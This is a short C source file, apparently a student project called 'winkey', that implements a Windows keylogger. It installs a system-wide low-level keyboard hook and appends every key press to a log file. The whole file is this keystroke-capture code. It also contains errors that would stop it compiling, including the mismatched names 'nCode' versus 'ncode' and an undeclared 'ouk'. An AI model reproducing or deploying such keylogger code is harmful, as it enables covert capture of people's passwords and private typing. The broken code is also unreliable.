#include "../winkey.h"

HHOOK g_ouk;

LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
{
	if (ncode == HC_ACTION)
	{
		if (wp == WM_KEYDOWN)
		{
			FILE *f = fopen("winkey.log", "a");
			if (f)
			{
				fprintf(f, "Key : %lu\n", ((KBDLLHOOKSTRUCT *)lp)->vkCode);
				fclose(f);
			}
		}
	}
	return (CallNextHookEx(g_ouk, nCode, wp, lp));
}


int main(void)
{
	g_ouk = SetWindowsHookEx(WH_KEYBOARD_LL, callback_clavier, NULL, 0);
	MSG msg;
	if (!ouk)
	{
		printf("Error: can't install the hook.\n");
		return 1;
	}
	printf("winkey: hook install ;)");
	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(&ouk);
	return (0);
}